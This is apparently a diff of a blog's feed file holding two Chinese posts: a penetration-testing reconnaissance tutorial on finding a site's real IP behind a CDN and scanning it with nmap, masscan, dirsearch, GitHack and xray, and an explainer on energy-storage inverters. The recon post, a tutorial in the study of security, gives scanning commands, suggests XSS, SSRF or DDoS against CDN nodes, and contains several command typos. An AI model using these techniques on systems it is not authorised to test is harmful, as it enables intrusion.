+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h2 id="DNS域名信息收集"><a href="#DNS域名信息收集" class="headerlink" title="DNS域名信息收集"></a>DNS域名信息收集</h2><ol><li><p>CDN检测绕过</p><p>在做DNS域名时，我们要先判断该域名是否存在cdn</p></li><li><p>DNS域名信息收集分为两种情况，一种是有cdn，一种无cdn，有CDN绕过CDN找到源服务器，无CDN的情况下直接收集</p></li></ol><h2 id="CDN是什么"><a href="#CDN是什么" class="headerlink" title="CDN是什么"></a>CDN是什么</h2><p>CDN是内容分发网络，类似DNS服务器一样，用户发送数据直接发送到CDN服务器，然后以CDN服务器以服务器真实IP发送请求，然后CDN服务器再转发给用户。这个显示的是CDN服务器。CDN里面存储资源文件的缓存</p><h2 id="CDN具体流程"><a href="#CDN具体流程" class="headerlink" title="CDN具体流程"></a>CDN具体流程</h2><p>用户使用域名发送请求，通过DNS解析得到IP地址，该IP地址为CDN的IP地址，CDN处理请求，发送给源服务器，源服务器返回给CDN，CDN返回给用户。</p><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><ol><li>有效防止DDOS攻击</li><li>防止攻击者对源服务器的端口探测</li></ol><h2 id="有CDN的情况下"><a href="#有CDN的情况下" class="headerlink" title="有CDN的情况下"></a>有CDN的情况下</h2><h3 id="怎样检测CDN"><a href="#怎样检测CDN" class="headerlink" title="怎样检测CDN"></a>怎样检测CDN</h3><ol><li><p>使用不同地方的ping服务器，查看对应响应IP地址是否唯一，如果不唯一，很可能是使用了CDN。有些不会直接显示，所以可以使用ping服务器网站，只要IP不唯一就可能使用了CDN.</p></li><li><p>ping服务器网站：</p><p><a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></p><p><a href="https://ping.aizhan.com/">https://ping.aizhan.com/</a></p></li></ol><h3 id="CDN信息收集以及绕过"><a href="#CDN信息收集以及绕过" class="headerlink" title="CDN信息收集以及绕过"></a>CDN信息收集以及绕过</h3><ol><li><p>子域名</p><p>子域名与主域名在同一台服务器上，</p><p>子域名与主域名不在同一台服务器上</p></li><li><p>查找子域名的方式</p><p>google搜索引擎</p><p>在线站点</p><ol><li><a href="https://tool.chinaz.com/subdomain">https://tool.chinaz.com/subdomain</a></li><li><a href="https://www.virustotal.com/">https://www.virustotal.com</a></li></ol><p>其他工具</p><ol><li>layer子域名挖掘机</li></ol></li><li><p>国外ping</p><p>有些地方没有cdn节点，可以找到真实的IP地址</p><p><a href="https://check-host.net/check-ping">https://check-host.net/check-ping</a>?</p><p><a href="https://get-site-ip.com/">https://get-site-ip.com/</a></p><p>多看一些冷门城市</p></li><li><p>历史的DNS解析记录。可能网站在部署之前或者人流量很少的时候没有购买CDN节点。</p><p><a href="https://dnsumpster.com/">https://dnsumpster.com/</a></p><p><a href="https://securitytralls.com/domain">https://securitytralls.com/domain</a></p><p><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p></li><li><p>通过ico图表哈希</p><p>首先获取网站图表文件，通过图标文件到fofa等站点搜索</p></li><li><p>利用邮件系统</p><p>有的邮件系统跟服务器是同一个IP地址，尤其是中小企业</p></li><li><p>通过网站证书https</p><p>找到序列号</p><p>转成十进制</p><p>使用fofa.info搜索</p></li><li><p>SSL证书查询</p><p><a href="https://crt.sh/">https://crt.sh</a></p><p><a href="https://search.censys.io/cetficates/">https://search.censys.io/cetficates/</a></p></li><li><p>通过网站漏洞，如XSS注入，SSRF，反弹权限，敏感信息泄露</p></li><li><p>通过其他工具比如脚本</p><p>bypass_cdn   <a href="https://github.com/Pluto-123/Bypass_cdn">Pluto-123&#x2F;Bypass_cdn: 绕过CDN查找网站的真实IP地址</a></p></li><li><p>DDOS打光节点流量，不推荐</p></li></ol><h2 id="hosts文件"><a href="#hosts文件" class="headerlink" title="hosts文件"></a>hosts文件</h2><p>hosts是一个没有扩展名的系统文件，可以用记事本等工具打开，其作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从Hosts中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS域名解析服务器进行IP地址的解析。</p><h2 id="无CDN情况下"><a href="#无CDN情况下" class="headerlink" title="无CDN情况下"></a>无CDN情况下</h2><ol><li>whois</li><li>站长之家：<a href="https://whois.chinaz.com/">https://whois.chinaz.com/</a></li><li>爱网站:<a href="https://www.aizhan.com/">https://www.aizhan.com/</a></li><li>bugscaner:<a href="http://whois.bugscaner.com/">http://whois.bugscaner.com/</a></li><li>ICP备案网查询:<a href="https://icp.chinaz.com/">https://icp.chinaz.com/</a></li></ol><h2 id="直接搜集"><a href="#直接搜集" class="headerlink" title="直接搜集"></a>直接搜集</h2><ol><li>企业Web网站：直接信息收集找网站漏洞</li><li>企业APP:通过app找url在web寻找漏洞 http</li><li>企业微信小程序：抓包小程序</li><li>企业有没有部署其他信息:有没有安装其他的软件比如向日葵，系统本身漏洞。</li></ol><h2 id="整站信息收集"><a href="#整站信息收集" class="headerlink" title="整站信息收集"></a>整站信息收集</h2><ol><li><p>服务器类型（windows&#x2F;linux）</p><p>大小写判断 nmp -O baidu.com</p><p>ping值判断 ttl 值 windows 128 linux 64</p></li><li><p>网站中间件</p><p>利用谷歌扩展(wappalyzer)探测</p><p>用whatweb工具探测： whatweb 域名</p><p><a href="http://finger.tidesec.com/%E9%80%9A%E8%BF%87%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB">http://finger.tidesec.com/通过指纹识别</a></p><p>通过f12查看响应标头，来判断</p><p>谷歌语法site: filetype:php</p><p>通过网站的url</p><p>识别cms 识别网站开发框架 找框架的历史漏洞</p></li></ol><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="扫描网站敏感目录或者文件"><a href="#扫描网站敏感目录或者文件" class="headerlink" title="扫描网站敏感目录或者文件"></a>扫描网站敏感目录或者文件</h2><h3 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h3><ol><li>100 请求者继续请求，正在等待其余部分</li><li>101 请求者要求服务器切换协议，服务器已确认并准备切换</li><li>2xx表示成功处理了请求：200 成功 201 已创建新的资源 202 已接受，但未处理 203非授权信息 204无内容 205重置内容 206部分内容</li><li>3XX 重定向，表示要完成请求，需要进一步操作，通常这些状态码是重定向</li><li>4XX 表示请求错误，妨碍了服务器处理 400 错误请求 401 未授权  403 禁止，服务器拒绝请求 404找不到请求的网页。。。</li><li>5XX 表示服务器内部错误，而不是请求出错</li></ol><h3 id="工具扫描"><a href="#工具扫描" class="headerlink" title="工具扫描"></a>工具扫描</h3><p>robots.txt 通过这个文件查看目录结构</p><p>disbuster <a href="https://sourceforge.net/projects/disbuster">https://sourceforge.net/projects/disbuster</a></p><p>dirsearch <a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p><h3 id="文件泄露"><a href="#文件泄露" class="headerlink" title="文件泄露"></a>文件泄露</h3><ol><li>.git文件泄露.如果发布代码的时候没有删除这个文件，可以恢复系统源码(<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a>)</li></ol><h2 id="旁站查询及C段查询工具"><a href="#旁站查询及C段查询工具" class="headerlink" title="旁站查询及C段查询工具"></a>旁站查询及C段查询工具</h2><ol><li><p>C段是指IP地址第三个字节，通常包含256个不同IP地址，C段和目标服务器再同一个网络的其他服务器，通过对C段中所有IP地址进行扫描和探测就可以发现与目标服务器相关的其他服务器和活动。拿到一台服务器的权限就相当于进入了内网，C段的意义扩大攻击面。</p></li><li><p>旁站查询</p><p>利用方式：若旁站与主站为同一个内外，拿下旁站，便能拿下主站，若不为内网则考虑内网渗透。</p><p>站长之家同IP查询</p><p><a href="https://stool.chinaz.com/same">https://stool.chinaz.com/same</a></p><p>wenscan查询</p><p><a href="https://www.webscan.cc/">https://www.webscan.cc/</a></p><p>C 段查询</p><p>nmap -p l-65535 -pn xx.xx.xx.0&#x2F;24</p><p>masscan扫描  端口0-1000的127.0.0.0网段</p><p>masscan -p 0-1000 -pn 127.0.0.0&#x2F;24 -oJ desktop&#x2F;1.txt</p><p>fofa</p><p><a href="https://fofa.info/">https://fofa.info/</a></p><p>ip&#x3D;”x.x.x.x&#x2F;24”</p><h2 id="网站漏洞扫描"><a href="#网站漏洞扫描" class="headerlink" title="网站漏洞扫描"></a>网站漏洞扫描</h2><ol><li><p>awvs 漏洞扫描工具</p></li><li><p>appscan 漏洞扫描工具</p></li><li><p>xray 红队漏洞扫描 <a href="https://github.com/chaitin/xray">https://github.com/chaitin/xray</a></p><p> .\xray.exe webscan –basic-crawler <a href="http://www.ocean888.cn/">http://www.ocean888.cn/</a> –html-output xray-crawler-testphp.html</p></li></ol></li></ol>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网络安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>逆变器</title>
+      <link href="/2024/11/19/%E8%87%AA%E5%8A%A8%E5%8C%96/%E9%80%86%E5%8F%98%E5%99%A8/"/>
+      <url>/2024/11/19/%E8%87%AA%E5%8A%A8%E5%8C%96/%E9%80%86%E5%8F%98%E5%99%A8/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>储能逆变器</p><ol><li>设备<br>PV源与BAT源</li></ol><p>串口服务器</p><p>三相电表</p><ol start="2"><li><p>储能逆变器<br>储能逆变器是一种电力转换设备，结合了逆变器和储能技术的特点。它能够实现直流电与交流电之间的相互转换。当外部供电不足或不可用时，储能逆变器会将储存的直流电能转换为交流电能，满足用电需求。这些逆变器通常由输入端、输出端和控制系统组成。总之，储能逆变器能够突破传统光伏逆变器的局限性，为电网系统提供高品质的电能，同时降低用电成本、提高用电效率。</p></li><li><p>储能逆变器工作原理<br>直流输入:储能逆变器接收来自可再生能源装置（如太阳能电池板、风力发电机等）或其他直流电池的电能输入。这些直流电源经过滤波和电压调节等处理步骤，以保证稳定的输入电压和电流</p></li></ol><p>逆变过程:在逆变器部分，直流电能被转换为交流电能。通过使用开关管件，对电路进行控制，调整直流电源的电流大小和方向，从而产生所需的交流电信号。</p><p>交流输出：通过逆变后的交流电信号，储能逆变器可以输出给电网或其他负载。通过控制输出电压和频率，可以实现对电力系统的调节和平衡。</p><p>储能逆变器通常配备先进的控制系统，用于监测和管理储能设备的状态和性能。通过实时监测电能的变化和需求，控制系统可以智能调整储能逆变器的工作方式，以实现最佳的能源利用率和电力传输效率。</p><ol start="4"><li>光伏逆变器<br>是太阳能发电系统的核心部件，其主要功能是将直流电转换为交流电，并馈入电网或负荷使用。</li></ol><p>光伏逆变器通过功率半导体器件的开关动作，将直流电转换为交流电。这是光伏逆变的第一步</p><p>转换后的交流电需要进行升压或降压，以适应不同的应用需求。这通常通过变压器或电抗器等设备实现。</p><ol start="4"><li>PV源作用<br>PV源也叫光伏源</li></ol><p>光伏并网储能逆变器将光伏电池板产生的直流电转换为交流电，并输出给电网。</p><p>PV源的作用是将太阳能光伏发电系统的能量注入电网，提高电网对大规模可再生能源(如风能和光伏)的接纳能力</p><p>PV源还可以将多余的电脑存储在电池中，以提供光伏发电系统的稳定性</p><ol start="5"><li>BAT源作用<br>BAT源指的是储能电池组，如超级电容器组，蓄电池组、飞轮电池</li></ol><p>储能逆变器可以适配不同类型的直流储能单元，将电池的直流电逆变为交流电，输送给电网或其他交流负荷使用。</p><p>BAT源的作用是实现能量的双向传递：从电网到电池进行放充电，从电池到电网进行放电</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 自动化 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 自动化 </tag>
             
         </tags>
       
